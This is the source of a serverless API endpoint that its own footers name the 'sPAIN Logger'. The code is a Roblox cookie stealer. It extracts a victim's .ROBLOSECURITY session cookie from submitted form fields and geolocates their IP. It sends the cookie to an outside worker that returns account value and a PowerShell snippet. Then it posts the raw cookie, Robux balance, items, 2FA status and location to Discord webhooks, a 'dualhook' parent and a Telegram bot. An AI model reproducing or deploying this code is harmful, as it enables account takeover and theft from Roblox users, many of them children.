// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN;
const TG_CHAT     = process.env.TG_CHAT;
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch (e) {
    console.error('redisGet error:', e.message);
    return null;
  }
}

async function redisSet(key, value) {
  try {
    const res = await fetch(
      `${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`,
      { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } }
    );
    return res.ok;
  } catch { return false; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

async function tgSend(text) {
  if (!TG_TOKEN || !TG_CHAT) return;
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);  if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                      if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                  if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

// Worker call — timeout after 12s so it never hangs
async function getWorkerData(cookie, victimIp) {
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 12000);
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, victimIp }),
      signal: controller.signal
    });
    clearTimeout(timeout);
    if (!r.ok) return null;
    return await r.json();
  } catch (e) {
    console.error('Worker fetch error:', e.message);
    return null;
  }
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!r.ok) console.error('Discord send failed:', r.status, await r.text());
  } catch (e) { console.error('discordSend error:', e.message); }
}

async function discordText(url, text, lang = '') {
  const prefix = lang ? `\`\`\`${lang}\n` : '';
  const suffix = lang ? '\n```' : '';
  const limit  = 1990 - prefix.length - suffix.length;
  let rem = text;
  let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, limit); rem = rem.substring(limit);
    await discordSend(url, { content: (first ? prefix : '') + chunk + (rem.length === 0 ? suffix : '') });
    first = false;
  }
}

// ── Cookie-only hit (when Roblox info unavailable / cookie expired) ──────────
async function sendCookieOnly(webhookUrl, { cookie, powershell, ip, geo, now, pageName }) {
  const ps = powershell || '';
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       '🍪 Cookie Captured',
      description: `🔥 \`sPAIN\` 🔥\n\n⚠️ Roblox info unavailable (cookie may be expired or rate-limited)`,
      color:       0xf59e0b,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',                                                                  inline: true  },
        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'N/A',  inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                            inline: true  },
        ...(ps ? [{ name: '📋 PowerShell', value: '```\n' + ps.substring(0, 1000) + (ps.length > 1000 ? '\n...' : '') + '\n```', inline: false }] : []),
        { name: '🕐 Date',     value: now, inline: false }
      ],
      footer: { text: `sPAIN Logger • ${pageName}` },
      timestamp: now
    }]
  });
  // Always send raw cookie + full PS
  await discordText(webhookUrl, cookie);
  if (ps.length > 1000) await discordText(webhookUrl, ps, 'powershell');
}

// ── Full hit with Roblox info ─────────────────────────────────────────────────
async function sendHit(webhookUrl, { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl }) {
  const ps = powershell || '';
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       `${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
      description: `🔥 \`sPAIN\` 🔥\n\n[Profile 👤](https://www.roblox.com/users/${roblox.id}/profile)${refreshUrl ? `\n[🔄 Refresh PowerShell](${refreshUrl})` : ''}`,
      color:       5793266,
      thumbnail:   { url: roblox.avatarUrl },
      fields: [
        { name: '🔴 Robux',     value: `${roblox.robux?.toLocaleString() || 0}`,                                              inline: true  },
        { name: '🎵 RAP',       value: `${roblox.limitedsValue?.toLocaleString() || 0} (${roblox.limitedsCount || 0} items)`,  inline: true  },
        { name: '🗓️ Age',       value: `${roblox.accountAgeDays} days`,                                                       inline: true  },
        { name: '💎 Premium',   value: roblox.isPremium ? 'Yes ✅' : 'No ❌',                                                 inline: true  },
        { name: '👥 Groups',    value: `Owned: ${roblox.groupsOwned} | R$: ${roblox.groupRobux?.toLocaleString() || 0}`,     inline: true  },
        { name: '🌐 IP',        value: ip || 'Unknown',                                                                       inline: true  },
        { name: '📍 Location',  value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') + (geo?.isp ? `\n${geo.isp}` : ''), inline: false },
        { name: '⚙️ Account',   value: `Email: ${roblox.emailSet}  2FA: ${roblox.twoFA}`,                                    inline: false },
        { name: '🎯 Gamepasses',value: `MM2: ${roblox.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${roblox.gamepasses?.adoptMe ? '✅' : '❌'} | Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`, inline: false },
        ...(ps ? [{ name: '📋 PowerShell', value: '```\n' + ps.substring(0, 1000) + (ps.length > 1000 ? '\n...' : '') + '\n```', inline: false }] : [])
      ],
      footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
      timestamp: now
    }]
  });
  if (ps.length > 1000) await discordText(webhookUrl, ps, 'powershell');
  await discordText(webhookUrl, cookie);
}

async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       '⚠️ Invalid Cookie — no cookie found',
      description: 'Nothing usable was submitted.',
      color:       0xff3333,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',                                                                 inline: true  },
        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',               inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                           inline: true  },
        { name: '🕐 Date',     value: now,                                                                              inline: false }
      ],
      footer:    { text: `sPAIN Tools • ${pageName}` },
      timestamp: now
    }]
  });
}

async function sendRefreshCard(webhookUrl, refreshUrl, pageName) {
  await discordSend(webhookUrl, {
    embeds: [{
      title:       '🔄 Get Fresh PowerShell Anytime',
      description: `**${refreshUrl}**`,
      color:       0x06b6d4,
      footer:      { text: `sPAIN Tools • ${pageName} • Keep this private` }
    }]
  });
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;

  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  // ── Validate Redis env vars up front ────────────────────────────────────────
  if (!REDIS_URL || !REDIS_TOKEN) {
    console.error('Missing UPSTASH_REDIS_REST_URL or UPSTASH_REDIS_REST_TOKEN');
    return res.status(500).json({ error: 'Server config error — Redis not configured' });
  }

  const record = await redisGet(`slot:${slug}`);
  if (!record) {
    console.error('Slug not found in Redis:', slug);
    return res.status(404).json({ error: `Page "${slug}" not found` });
  }
  if (!record.webhook) {
    console.error('No webhook on record for slug:', slug);
    return res.status(500).json({ error: 'No webhook configured for this page' });
  }

  // ── Respond immediately so client never waits ────────────────────────────────
  res.status(200).json({ success: true });

  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
            || req.headers['x-real-ip'] || 'Unknown';

    const [geo, cookie] = await Promise.all([
      getIpGeo(ip),
      Promise.resolve(findCookie(slots))
    ]);

    const now      = new Date().toISOString();
    const pageName = record.displayName || slug;

    // No cookie at all → send invalid notice
    if (!cookie) {
      await sendInvalid(record.webhook, { ip, geo, now, pageName });
      await tgSend(`⚠️ <b>NO COOKIE — ${pageName}</b>\n🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}\n🕐 ${now}`);
      return;
    }

    // Try to get Roblox info + PowerShell from worker
    const workerData = await getWorkerData(cookie, ip);
    const roblox     = workerData?.valid ? workerData : null;
    const powershell = workerData?.powershell || null;

    // Load dualhook parent
    let parent = null;
    if (record.dualhookParent) parent = await redisGet(`slot:${record.dualhookParent}`);

    const webhooks = [record.webhook];
    if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);

    if (roblox) {
      // ── Full hit — Roblox info available ──────────────────────────────────
      let refreshUrl = null;
      const refreshId = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
      refreshUrl = `https://spain-tools.vercel.app/r/${refreshId}`;
      await redisSet(`refresh:${refreshId}`, {
        cookie, webhook: record.webhook, webhook1: parent?.webhook || null, pageName
      });

      const payload = { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl };
      for (const wh of webhooks) {
        await sendHit(wh, payload);
        await sendRefreshCard(wh, refreshUrl, pageName);
      }

      await tgSend([
        `✅ <b>VALID HIT — ${roblox.username} ${roblox.isPremium ? '⭐' : ''}</b>`,
        `💰 Robux: ${roblox.robux?.toLocaleString() || 0}`,
        `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
        `📄 Page: ${pageName}`,
        `🔄 Refresh: ${refreshUrl}`
      ].join('\n'));

    } else {
      // ── Cookie captured but Roblox info failed (expired / rate-limited) ────
      const payload = { cookie, powershell, ip, geo, now, pageName };
      for (const wh of webhooks) {
        await sendCookieOnly(wh, payload);
      }

      await tgSend([
        `🍪 <b>COOKIE ONLY — ${pageName}</b>`,
        `⚠️ Roblox info failed (expired or rate-limited)`,
        `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
        `🕐 ${now}`
      ].join('\n'));
    }

  } catch (err) {
    console.error('Post-response error:', err.message, err.stack);
  }
}
